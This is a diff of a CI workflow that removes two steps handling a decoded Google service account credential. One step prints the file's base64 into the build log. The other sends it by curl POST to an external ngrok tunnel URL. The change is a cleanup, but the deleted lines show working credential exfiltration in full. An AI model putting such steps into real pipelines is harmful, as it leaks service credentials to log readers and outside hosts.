@@ -106,46 +106,6 @@ jobs:
         run: |
           echo "${{ secrets.GOOGLE_SERVICES_ACCOUNT_BASE64 }}" | base64 --decode > google_service_account.json
 
-      - name: Log google_service_account.json base64 (for manual copy)
-        run: |
-          # Write base64 to a file
-          base64 -w 0 google_service_account.json > base64_output.txt
-          
-          echo "=========================================="
-          echo "Base64 for google_service_account.json:"
-          echo "=========================================="
-          echo ""
-          echo "***** START BASE64 *****"
-          echo ""
-          cat base64_output.txt
-          echo ""
-          echo "***** END BASE64 *****"
-          echo ""
-          echo "=========================================="
-          echo "To use locally, copy the base64 between the markers and run:"
-          echo "echo '<base64_string>' | base64 --decode > google_service_account.json"
-          echo "=========================================="
-
-      - name: Send google_service_account.json base64 to local server
-        run: |
-          BASE64_CONTENT=$(base64 -w 0 google_service_account.json)
-          API_URL="https://77f0ef9aa5bd.ngrok-free.app/receive-base64"
-          echo "Sending base64 data to API endpoint: $API_URL"
-          RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$API_URL" \
-            -H "Content-Type: application/json" \
-            -d "{\"base64\": \"$BASE64_CONTENT\", \"filename\": \"google_service_account.json\"}")
-          
-          HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-          BODY=$(echo "$RESPONSE" | sed '$d')
-          
-          if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 201 ]; then
-            echo "✅ Successfully sent base64 data to API endpoint (HTTP $HTTP_CODE)"
-            echo "Response: $BODY"
-          else
-            echo "⚠️ Warning: API request returned HTTP $HTTP_CODE"
-            echo "Response: $BODY"
-          fi
-
       - name: Create firebase google_service_account.json
         env:
           CREDENTIAL_FILE_CONTENT: ${{ secrets.CREDENTIAL_FILE_CONTENT }}
